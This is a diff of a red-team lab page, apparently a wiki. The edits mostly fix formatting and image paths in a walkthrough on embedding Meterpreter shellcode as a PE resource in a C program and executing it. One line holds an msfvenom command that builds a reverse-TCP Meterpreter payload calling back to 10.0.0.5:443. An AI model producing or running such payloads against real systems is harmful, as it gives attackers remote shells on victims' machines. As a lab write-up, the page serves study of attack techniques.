@@ -4,13 +4,13 @@
 
 This lab shows one of the techniques how one could load and execute a non-staged shellcode from within a C program using PE resources using Visual Studio.
 
-If you've ever tried executing an unstaged shellcode from a C/C++ program, you know that you will be having a hard time doing it if you are defining a huge char array which looks like this \(just a snippet\):
+If you've ever tried executing an unstaged shellcode from a C/C++ program, you know that you will be having a hard time doing it if you are defining a huge char array which looks like this (just a snippet):
 
-![](../../.gitbook/assets/screenshot-from-2019-04-21-12-33-31%20%281%29.png)
+![](<../../.gitbook/assets/Screenshot from 2019-04-21 12-33-31.png>)
 
-Below is a quick walkthrough that was inspired by [@\_RastaMouse](https://twitter.com/_RastaMouse) tweet:
+Below is a quick walkthrough that was inspired by [@\_RastaMouse](https://twitter.com/\_RastaMouse) tweet:
 
-![](../../.gitbook/assets/screenshot-from-2019-04-21-13-13-14.png)
+![](<../../.gitbook/assets/Screenshot from 2019-04-21 13-13-14.png>)
 
 ## Embedding The Shellcode as a Resource
 
@@ -22,25 +22,25 @@ msfvenom -p windows/meterpreter_reverse_tcp LHOST=10.0.0.5 LPORT=443 > meterpret
 
 Right click on the `Resource Files` in Solution Explorer and select `Add > Resource`
 
-![](../../.gitbook/assets/screenshot-from-2019-04-21-12-37-31.png)
+![](<../../.gitbook/assets/Screenshot from 2019-04-21 12-37-31.png>)
 
 Click `Import` and select the resource you want to include. In my case - it's the `meterpreter.bin`:
 
-![](../../.gitbook/assets/screenshot-from-2019-04-21-11-42-31.png)
+![](<../../.gitbook/assets/Screenshot from 2019-04-21 11-42-31.png>)
 
-Give resource a resource type name - anything works, but you need to remember it when calling `FindResource` API call \(shown later in the code\):
+Give resource a resource type name - anything works, but you need to remember it when calling `FindResource` API call (shown later in the code):
 
-![](../../.gitbook/assets/screenshot-from-2019-04-21-11-43-59.png)
+![](<../../.gitbook/assets/Screenshot from 2019-04-21 11-43-59.png>)
 
 At this point, you can see in your resource browser that the `meterpreter.bin` is now included in your program's resources:
 
-![](../../.gitbook/assets/screenshot-from-2019-04-21-11-45-49.png)
+![](<../../.gitbook/assets/Screenshot from 2019-04-21 11-45-49.png>)
 
-![](../../.gitbook/assets/screenshot-from-2019-04-21-12-07-17.png)
+![](<../../.gitbook/assets/Screenshot from 2019-04-21 12-07-17.png>)
 
 If you compile your program now and inspect it with resource hacker, you can now see the shellcode you have just embedded as a PE resource:
 
-![](../../.gitbook/assets/screenshot-from-2019-04-22-17-35-35.png)
+![](<../../.gitbook/assets/Screenshot from 2019-04-22 17-35-35.png>)
 
 ## Code
 
@@ -70,7 +70,6 @@ int main()
 
 Compile and run the binary and enjoy the shell:
 
-![](../../.gitbook/assets/peek-2019-04-21-12-30.gif)
+![](<../../.gitbook/assets/Peek 2019-04-21 12-30.gif>)
 
 {% embed url="https://docs.microsoft.com/en-us/windows/desktop/menurc/finding-and-loading-resources" %}
-
